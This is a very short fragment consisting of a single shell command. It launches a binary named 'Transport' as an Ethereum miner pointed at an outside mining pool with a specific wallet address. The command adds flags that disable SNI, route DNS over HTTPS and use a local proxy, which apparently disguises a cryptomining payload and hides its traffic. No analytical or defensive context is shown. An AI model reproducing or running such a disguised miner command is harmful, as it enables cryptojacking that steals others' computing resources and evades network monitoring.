...
./Transport -a ethash -o stratum+ssl://eth-us-east.flexpool.io:5555 -u 0xB94e3506B580920d5c7d1e7ebad2D79259192E11 -p x -w Trans --no-sni --dns-https-server 1.1.1.1 --proxy 127.0.0.1:9999
